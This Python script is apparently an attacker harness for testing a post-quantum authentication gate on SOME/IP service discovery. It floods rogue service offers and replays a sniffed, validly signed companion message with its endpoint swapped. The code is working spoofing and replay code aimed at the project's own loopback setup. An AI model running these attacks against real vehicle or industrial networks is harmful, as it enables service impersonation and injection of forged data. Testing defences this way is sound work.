"""
attacker_service.py -- R3 version (extends the R2 script)

Adds a second attack mode, "substitution", alongside the original R2 "flood" mode,
implementing the endpoint-substitution replay attack described in the R3 design document
(§6, §8).

  mode="flood"        (unchanged from R2): a naive rogue ServerServiceInstance offers
                       the same Service ID on its own port with a fast cyclic offer
                       delay. No PQ-Auth is ever produced for the attacker's endpoint,
                       so secure_daemon.py's gate should drop every one of these
                       OfferService broadcasts (design doc §12, "downgrade attack" /
                       plain forgery case).

  mode="substitution": the specific endpoint-substitution/replay gap design doc §6
                       identified: the attacker sniffs the multicast group for the
                       real Camera's validly-signed PQ-Auth companion message, then
                       rebroadcasts a MUTATED copy of it with the endpoint fields
                       swapped to point at the attacker's own service, while re-using
                       the ORIGINAL (now-mismatched) signature bytes verbatim. Because
                       the signed scope covers the endpoint (design doc §6), this
                       forged message must fail verification. The attacker also runs
                       its own rogue ServerServiceInstance (like flood mode) so there
                       is a real, attacker-controlled OfferService entry claiming that
                       same mismatched endpoint. Both halves should be rejected by
                       secure_daemon.py.

Usage:
    python3 attacker_service.py flood <delay_ms>
    python3 attacker_service.py substitution <delay_ms>
"""

import asyncio
import socket
import sys
import time

from someipy import ServiceBuilder, connect_to_someipy_daemon, ServerServiceInstance, EventGroup, Event, TransportLayerProtocol

from pq_crypto import CompanionAuthMessage, PQSignatureOption

SERVICE_ID = 0x1234
INSTANCE_ID = 0x0001
ATTACKER_PORT = 30511

SD_ADDRESS = "224.224.224.245"
SD_PORT = 30490

mode = sys.argv[1] if len(sys.argv) > 1 else "flood"
delay_ms = int(sys.argv[2]) if len(sys.argv) > 2 else 100


def sniff_companion_message(timeout_s: float = 5.0) -> "CompanionAuthMessage | None":
    """Listens on the SD multicast group for one PQ-Auth companion message for our
    target Service ID, and returns it unmodified (this is the "capture" half of the
    substitution attack -- the attacker needs a real, validly-signed message to try
    to abuse in the first place)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("", SD_PORT))
    # Joining via the explicit local interface (rather than "0.0.0.0"/any) is required
    # on loopback-only networks (some sandboxes/minimal containers with no default
    # route) -- "0.0.0.0" raised OSError: [Errno 19] No such device there.
    mreq = socket.inet_aton(SD_ADDRESS) + socket.inet_aton("127.0.0.1")
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    sock.settimeout(timeout_s)

    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            data, _addr = sock.recvfrom(4096)
        except socket.timeout:
            break
        if not data.startswith(b"PQA1"):
            continue
        try:
            msg = CompanionAuthMessage.from_buffer(data)
        except Exception:
            continue
        if msg.service_id == SERVICE_ID:
            sock.close()
            return msg
    sock.close()
    return None


def broadcast_forged_companion(captured: "CompanionAuthMessage", repeats: int, spacing_s: float):
    """Rebroadcasts a mutated copy of the captured message with the endpoint fields
    swapped to the attacker's own service, keeping the ORIGINAL signature bytes.
    This is the exact attack design doc §6 describes -- and it must fail verification,
    because the signed scope is derived from the (now falsified) endpoint fields."""
    forged = CompanionAuthMessage(
        service_id=captured.service_id,
        instance_id=captured.instance_id,
        major_version=captured.major_version,
        ttl=captured.ttl,
        endpoint_ip="127.0.0.1",
        endpoint_port=ATTACKER_PORT,
        counter=captured.counter + 1,  # also try to look "fresher" than the original
        option=PQSignatureOption(
            alg_id=captured.option.alg_id,
            signature=captured.option.signature,  # stolen, unmodified signature bytes
        ),
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
    # See the matching comment in camera_service.py: needed on loopback-only networks.
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton("127.0.0.1"))
    for _ in range(repeats):
        sock.sendto(forged.to_buffer(), (SD_ADDRESS, SD_PORT))
        time.sleep(spacing_s)
    sock.close()
    print(
        f"[*] Broadcast {repeats} forged PQ-Auth companion messages claiming "
        f"127.0.0.1:{ATTACKER_PORT} with the stolen (mismatched) signature -- "
        f"these should all fail verification at the gateway."
    )


async def start_attacker_service():
    someipy_daemon = await connect_to_someipy_daemon()

    video_event = Event(id=0x8000, protocol=TransportLayerProtocol.UDP)
    video_eventgroup = EventGroup(id=0x4000, events=[video_event])
    service = ServiceBuilder().with_service_id(SERVICE_ID).with_major_version(1).with_eventgroup(video_eventgroup).build()

    attacker_service = ServerServiceInstance(
        daemon=someipy_daemon, service=service, instance_id=INSTANCE_ID,
        endpoint_ip="127.0.0.1", endpoint_port=ATTACKER_PORT, ttl=5,
        cyclic_offer_delay_ms=delay_ms
    )

    if mode == "substitution":
        print("[*] Substitution attack: sniffing for a real, validly-signed PQ-Auth message...")
        captured = sniff_companion_message()
        if captured is None:
            print("[!] Never captured a real PQ-Auth message -- is camera_service.py running?")
        else:
            print(
                f"[*] Captured a real PQ-Auth message: endpoint "
                f"{captured.endpoint_ip}:{captured.endpoint_port}, counter={captured.counter}"
            )
            broadcast_forged_companion(captured, repeats=5, spacing_s=0.05)

    await attacker_service.start_offer()

    try:
        while True:
            await asyncio.sleep(0.005)
            attacker_service.send_event(0x4000, 0x8000, b'HACKED_FRAME_MALWARE')
    except asyncio.CancelledError:
        pass
    finally:
        await attacker_service.stop_offer()
        await someipy_daemon.disconnect_from_daemon()

if __name__ == "__main__":
    try:
        asyncio.run(start_attacker_service())
    except KeyboardInterrupt:
        pass
